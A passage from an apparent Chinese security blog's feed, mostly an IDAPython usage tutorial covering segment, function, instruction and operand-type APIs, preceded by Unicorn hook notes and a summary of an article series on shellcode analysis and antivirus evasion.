class="keyword">int64_t</span> value, <span class="keyword">void</span> *user_data)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>type: 内存操作类型 READ, or WRITE</li><li>address: 当前指令地址</li><li>size: 读或写的长度</li><li>value: 写入的值（type = read时无视）</li><li>user_data: hook_add 设置的user_data参数<br>  返回值<br>  返回真，继续模拟执行<br>  返回假，停止模拟执行</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/242548&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/242548&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;杀软的无奈是我准备开始写的一个新的专题文章，主要用来分享恶意代码分析过程用到的一些方法和工具，以及shellcode编写,shellcode分析，metasploit中的shellcode编码器的实现，编码器特征码定位，编码shellcode绕过杀软检测，基于unicorn检测shellcode编码器等相关的知识。文章中讲的案例会主要集中在linux平台中的ELF文件，但是由于个人的精力和知识水平有限，文章更新的频率和质量不太敢保证。如果有地方写的不太对，希望大佬们能够积极斧正，给与一些指导和帮助。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="杀软的无奈" scheme="http://blog.wonderkun.cc/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/"/>
    
  </entry>
  
  <entry>
    <title>idapython使用笔记</title>
    <link href="http://blog.wonderkun.cc/2020/12/11/idapython%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.wonderkun.cc/2020/12/11/idapython使用笔记/</id>
    <published>2020-12-11T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<h3 id="idapython的学习资料推荐"><a href="#idapython的学习资料推荐" class="headerlink" title="idapython的学习资料推荐"></a>idapython的学习资料推荐</h3><ol><li>《ida权威指南第二版》</li><li>[<a href="https://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.html]</a>(<a href="https://wooyun.js.org/drops/IDAPython" target="_blank" rel="noopener">https://wooyun.js.org/drops/IDAPython</a> 让你的生活更滋润 part1 and part2.html) </li><li><a href="https://cartermgj.github.io/2017/10/10/ida-python/" target="_blank" rel="noopener">https://cartermgj.github.io/2017/10/10/ida-python/</a> </li></ol><a id="more"></a><ol start="4"><li><a href="https://www.hex-rays.com/products/ida/support/idapython_docs/" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/idapython_docs/</a> </li><li>《idapython book》有中文版本的翻译</li><li><a href="https://bbs.pediy.com/thread-225091.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225091.htm</a>  python模拟执行x86，基于idapython</li><li>《The Beginner’s Guide to IDAPython version 6.0》</li></ol><h3 id="ida-python2-and-python3-switch"><a href="#ida-python2-and-python3-switch" class="headerlink" title="ida python2 and python3 switch"></a>ida python2 and python3 switch</h3><p>You have chosen to enable IDAPython 2.  The IDAPython 3 plugins have been renamed to idapython.3.disabled and idapython64.3.disabled in the plugins subdirectory.  If you want to switch to IDAPython 3, proceed as follows:</p><ol><li>Rename idapython[64].dll to idapython[64].2.disabled.</li><li>Rename idapython[64].3.disabled to idapython[64].dll.</li><li>Make sure a 64-bit Python 3 interpreter is installed.</li><li>Run the command-line tool idapyswitch to configure IDAPython 3 for your Python interpreter.</li></ol><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>IDAPython核心有如下3个python模块：</p><ol><li>idc模块负责提供IDC中所有的函数功能。</li><li>idautils提供大量的实用函数，其中许多函数可生成各种数据库相关对象(如函数或交叉引用)的python列表。</li><li>idaapi 允许使用者通过类的形式，访问更多底层的数据 。</li></ol><p>需要注意的是IDAPython会自动导入idc和idautils模块，idaapi模块需要自己手工导入。</p><p>为了使用的清晰性，建议在开头都进行手工的import这三个模块。</p><p><strong>注意事项</strong></p><p>由于idaPython的升级，导致一些函数给改没了，文档中不再对之前版本的函数进行说明，但是这些函数都用新函数进行了实现，新旧关系的对应在文件 <code>idc_bc695.py</code>，可以进行对照说明。</p><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>获取当前地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idc.here()</span><br><span class="line">idc.get_screen_ea()</span><br></pre></td></tr></table></figure><p>获取当前地址空间的最小地址和最大地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line">idc.get_inf_attr(INF_MAX_EA)</span><br></pre></td></tr></table></figure><p>在ida的反汇编窗口中，下面的每一个信息都可以用函数获取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00012529 mov esi, [esp+4+arg_0]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python&gt; idc.get_segm_name(here())</span><br><span class="line"><span class="string">'.text'</span></span><br><span class="line">Python&gt; idc.GetDisasm(here())</span><br><span class="line"><span class="string">'call    sub_405060'</span></span><br><span class="line"></span><br><span class="line">Python&gt;idc.print_insn_mnem(here())</span><br><span class="line"><span class="string">'call'</span></span><br><span class="line">Python&gt;idc.print_operand(here(),<span class="number">0</span>)</span><br><span class="line"><span class="string">'sub_405060'</span></span><br><span class="line">Python&gt;idc.print_operand(here(),<span class="number">1</span>)</span><br><span class="line"><span class="string">''</span></span><br></pre></td></tr></table></figure><h4 id="段操作"><a href="#段操作" class="headerlink" title="段操作"></a>段操作</h4><p>打印一行数据好像并没什么卵用，但是 IDAPython 的强大之处在于它能遍历所有的指<br>令，所有的交叉引用地址，还有搜索所有的代码和数据。后面两项功能稍后再做介绍。我们<br>先从遍历所有段的指令开始讲起。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    print(idc.get_segm_name(seg),idc.get_segm_start(seg),idc.get_segm_end(seg))</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>遍历所有函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    print(func,idc.get_func_name(func))</span><br></pre></td></tr></table></figure><p>Functions()将返回一个保存着已知函数首地址的数组，同样此函数也可以用来查找在指定地址范围的函数列表。</p><p>get_func_name(ea)用来获取函数名，ea这个参数可以是处于函数中的任何地址。</p><p><code>idaapi.get_func_qty()</code>  获取此binary中识别的函数的个数。</p><p><code>idaapi.getn_func(1)</code>获取第1个函数的对象。</p><p>获取函数的边界信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;idaapi.get_func(here())</span><br><span class="line">&lt;ida_funcs.func_t; proxy of &lt;Swig Object of type <span class="string">'func_t *'</span> at <span class="number">0x000001711FC33C00</span>&gt; &gt;</span><br><span class="line">Python&gt;idaapi.get_func(here()).start_ea</span><br><span class="line"><span class="number">0x40573c</span></span><br><span class="line">Python&gt;idaapi.get_func(here()).end_ea</span><br><span class="line"><span class="number">0x405918</span></span><br></pre></td></tr></table></figure><p>同时也可以使用 idc.get_next_func(ea)和get_prev_func(ea)获取ea地址的后一个函数和前一个函数。ea 的值需要在被分析的函数地址之内。在枚举函数的时候，只有 IDA 将这段代码标记为函数的时候才行，不然会在枚举的过程中被跳过。没有被标记为函数的代码将在图例（ida 顶部的彩色条）中标为红色。当然我们可以手工的修复这些无法被标记为函数的代码。</p><p>还可以使用如下两个api来获取函数的边界地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;idc.get_func_attr(here(), FUNCATTR_START)</span><br><span class="line"><span class="number">0x404c90</span></span><br><span class="line">Python&gt;idc.get_func_attr(here(), FUNCATTR_END)</span><br><span class="line"><span class="number">0x405055</span></span><br></pre></td></tr></table></figure><p><code>get_func_attr</code>的第二个参数有如下值：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">FUNCATTR_START</span> = <span class="number">0</span> <span class="comment"># function start address</span></span><br><span class="line"><span class="attr">FUNCATTR_END</span> = <span class="number">4</span> <span class="comment"># function end address</span></span><br><span class="line"><span class="attr">FUNCATTR_FLAGS</span> = <span class="number">8</span> <span class="comment"># function flags</span></span><br><span class="line"><span class="attr">FUNCATTR_FRAME</span> = <span class="number">10</span> <span class="comment"># function frame id</span></span><br><span class="line"><span class="attr">FUNCATTR_FRSIZE</span> = <span class="number">14</span> <span class="comment"># size of local variables</span></span><br><span class="line"><span class="attr">FUNCATTR_FRREGS</span> = <span class="number">18</span> <span class="comment"># size of saved registers area</span></span><br><span class="line"><span class="attr">FUNCATTR_ARGSIZE</span> = <span class="number">20</span> <span class="comment"># number of bytes purged from the stack</span></span><br><span class="line"><span class="attr">FUNCATTR_FPD</span> = <span class="number">24</span> <span class="comment"># frame pointer delta</span></span><br><span class="line"><span class="attr">FUNCATTR_COLOR</span> = <span class="number">28</span> <span class="comment"># function color code</span></span><br><span class="line"><span class="attr">FUNCATTR_OWNER</span> = <span class="number">10</span> <span class="comment"># chunk owner (valid only for tail chunks)</span></span><br><span class="line"><span class="attr">FUNCATTR_REFQTY</span> = <span class="number">14</span> <span class="comment"># number of chunk parents (valid only for tail chunks)</span></span><br></pre></td></tr></table></figure><p><code>idc.get_name_ea_simple(&quot;runtime_concatstring3&quot;)</code> 利用函数名获取一个函数的地址。</p><p>下面遍历函数的所有指令:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = idc.get_func_attr(here(),FUNCATTR_START)</span><br><span class="line">end = idc.get_func_attr(here(), FUNCATTR_END)</span><br><span class="line"></span><br><span class="line">curr_addr = start </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> curr_addr &lt;= end:</span><br><span class="line">    print(hex(curr_addr),idc.GetDisasm(curr_addr))</span><br><span class="line">    curr_addr = idc.next_head(curr_addr,end)</span><br></pre></td></tr></table></figure><p><code>idc.next_head(curr_addr,end)</code>返回处于<code>curr_addr</code>和<code>end</code>之间的下一条指令的地址，如果没有指令则返回 <code>idc.BADADDR</code>。这种方法的一个缺陷是它依赖于指令被包含在函数开始和结束的边界内。打个比方说，函数内有个 jmp 指令，它跳转到比这个函数结束地址还要高的地址中去，意思是这个函数的所有指令可能并不是线性的，它可能会通过jmp 跳出函数边界（起始地址和结束地址），但其实这段指令仍是属于这个函数的，那么我们使用上述的方法就不能够遍历到该函数要执行的所有指令。这种跳转在代码混淆中非常的常见，所以说我们最好还是使用 idautils.FuncItems(ea)来循环函数内的指令。</p><p><code>idc.prev_head(ea)</code>获取ea地址的上一条指令的地址。</p><p>关于函数的详细信息有如下几个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrame</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FRAME)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrameLvarSize</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FRSIZE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrameRegsSize</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FRREGS)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrameArgsSize</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_ARGSIZE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFunctionFlags</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FLAGS)</span><br></pre></td></tr></table></figure><p>例如用如下代码获取函数的标志：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_NORET:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_NORET"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_FAR:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_FAR"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_LIB"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_STATIC:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_STATIC"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_FRAME:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_FRAME"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_USERFAR:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_USERFAR"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_HIDDEN:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_HIDDEN"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_THUNK"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_BOTTOMBP"</span>)</span><br></pre></td></tr></table></figure><p>各种标志的含义如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">FUNC_NORET:</span> 这个标志表示某个函数是否有返回值，它本身的值是 <span class="number">1</span>，下面是一个没有返回值的函数，</span><br><span class="line">注意它没有函数的最后并不是 <span class="keyword">ret</span> 或者 leave 指令</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_FAR:</span> 这个标志非常少的出现，标志程序是否使用分段内存，它的值为 <span class="number">2</span>。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_USERFAR:</span> 这个标志也非常少见，也很少有文档，HexRays 把它描述为“user has specified far-ness</span><br><span class="line">of the function”，它的值是 <span class="number">32.</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_LIB:</span> 这个表示用于寻找库函数的代码。识别库函数代码是非常有必要的，因为我们在分析的</span><br><span class="line">时候一般将其跳过，它的值是 <span class="number">4</span>。下面的例子展示了如何使用这个标志。</span><br><span class="line"></span><br><span class="line">for func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line"></span><br><span class="line">    if flags &amp; FUNC_LIB:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_LIB"</span>,get_func_name(func))</span><br><span class="line">        </span><br><span class="line"><span class="symbol">FUNC_STATIC:</span> 这个标志作用在于识别该函数在编译的是否是一个静态函数。在 c 语言中静态函数被默</span><br><span class="line">认为是全局的。如果作者把这个函数定义为静态函数，那么这个函数在只能被本文件中的函</span><br><span class="line">数访问。利用静态函数的判定我们可以更好的理解源代码的结构。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_FRAME:</span> 这个标志表示函数是否使用了 ebp 寄存器（帧指针），使用 ebp 寄存器的函数通常有如</span><br><span class="line">下的语法设定，目的是为了保存栈帧。</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00404</span>C90                 <span class="keyword">push</span>    ebp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00404</span>C91                 <span class="keyword">mov</span>     ebp, esp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00404</span>C96                 <span class="keyword">sub</span>     esp, <span class="number">65</span>Ch</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_BOTTOMBP:</span> 和 FUNC_FRAME 一样，该标志用于跟踪帧指针（ebp）。它作用是识别函数中帧指针是</span><br><span class="line">否等于堆栈指针（esp）。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_HIDDEN:</span> 带有 FUNC_HIDDEN 标志的函数意味着它们是隐藏的，这个函数需要展开才能查看。如</span><br><span class="line">果我们跳转到一个标记为 HIDDEN 的地址的话，它会自动的展开。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_THUNK:</span> 表示这个函数是否是一个 thunk 函数，thunk 函数表示的是一个简单的跳转函数。</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1</span>A710606 Process32Next proc near</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1</span>A710606 <span class="keyword">jmp</span> ds:__imp_Process32Next</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1</span>A710606 Process32Next endp</span><br><span class="line"></span><br><span class="line">需要注意的是一个函数可能拥有多个标志的组合。</span><br></pre></td></tr></table></figure><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>如果我们拥有一个函数中的指令地址，我们可以使用 idautils.FuncItems(ea)来获取该函数中所有指令地址的集合。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">items = idautils.FuncItems(here())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">    print(hex(item),idc.GetDisasm(item))</span><br></pre></td></tr></table></figure><p>idautils.FuncItems(ea)会获取ea这个地址所在函数的所有指令的地址，返回一个迭代器。</p><p>现在我们已经完全掌握了如何循环遍历程序中的段，函数和指令，那我们就开始 show 一个非常有用的例子。有时候我们会逆向一个加壳的代码，这时知道代码中哪里进行了动态调用对分析是非常有帮助的。一个动态<br>的调用可能是由 call 或者 jump 加上一个操作数来实现的，比如说 call eax，或者 jmp edi。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB <span class="keyword">or</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dism_addr = idautils.FuncItems(func)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dism_addr:</span><br><span class="line">        m = idc.print_insn_mnem(line)</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">"call"</span> <span class="keyword">or</span> m == <span class="string">"jmp"</span>:</span><br><span class="line">            op = idc.get_operand_type(line,<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> op == o_reg:</span><br><span class="line">                print(hex(line),idc.GetDisasm(line))</span><br></pre></td></tr></table></figure><p><code>get_operand_type(ea,n)</code>获取操作数类型，n=0表示第一个操作数，n=1表示第二个操作数。</p><p>关于类型的定义请看下一节。</p><p>获取当前指令的下一个指令的地址和上一个指令的地址,<code>idc.next_head</code>和<code>idc.prev_head</code>，这两个函数的功能获取的是下一条指令的地址而不是下一个地址，如果要获取下一个地址或者上一个的话，我们使用的是</p><p><code>idc.next_addr</code>和<code>idc.prev_addr</code>。</p><h4 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h4><p>操作数在逆向分析中经常被使用，所以说了解所有的操作数类型对逆向分析是非常有帮助的。在前面文中提到我们可以使用 idc.get_operand_type(ea,n)来获取操作数类型，ea 是一个地址，n 是一个索引。操作数总共有八种不同的类型。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">o_void: 如果指令没有任何操作数，它将返回 <span class="number">0</span>。</span><br><span class="line">o_reg: 如果操作数是寄存器，则返回这种类型，它的值为 <span class="number">1</span></span><br><span class="line">o_mem: 如果操作数是直接寻址的内存，那么返回这种类型，它的值是 <span class="number">2</span>，这种类型对寻找 DATA</span><br><span class="line">的引用非常有帮助。</span><br><span class="line"></span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0xa05d86</span> cmp ds:dword_A152B8, <span class="number">0</span></span><br><span class="line">Python&gt;print idc.GetOpType(ea,<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line">o_phrase: 如果操作数是利用基址寄存器和变址寄存器的寻址操作的话，那么返回该类型，值为<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0x1000b8c2</span> mov [edi+ecx], eax</span><br><span class="line">Python&gt;print idc.GetOpType(ea,<span class="number">0</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">o_displ: 如果操作数是利用寄存器和位移的寻址操作的话，返回该类型，值为 <span class="number">4</span>，位移指的是像如下代码中的 <span class="number">0x18</span>，这在获取结构体中的某个数据是非常常见的。</span><br><span class="line"></span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0xa05dc1</span> mov eax, [edi+<span class="number">18</span>h]</span><br><span class="line">Python&gt;print idc.GetOpType(ea,<span class="number">1</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line">o_imm: 如果操作数是一个确定的数值的话，那么返回类型，值为 <span class="number">5</span></span><br><span class="line">-------------------------------------------</span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0xa05da1</span> add esp, <span class="number">0</span>Ch</span><br><span class="line">Python&gt;print idc.get_operand_type(ea,<span class="number">1</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line">-------------------------------------------</span><br><span class="line">o_far: 这种返回类型在 x86 和 x86_64 的逆向中不常见。它用来判断直接访问远端地址的操作数，值为<span class="number">6</span></span><br><span class="line">o_near: 这种返回类型在 x86 和 x86_64 的逆向中不常见。它用来判断直接访问近端地址的操作数，值为 <span class="number">7</span></span><br></pre></td></tr></table></figure><h5 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h5><p>当我们在逆向一个可执行文件的时候，我们可能会注意到一些代码会不断的重复使用某<br>个偏移量。这种操作感觉上是代码在传递某个结构体给不同的函数使用。接下来的这个例子<br>的目的是创建一个 python 的字典，字典包含了可执行文件中使用的所有偏移量，让偏移量<br>作为字典的 key，而每个 key 对应的 value 存储着所有使用该偏移量的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 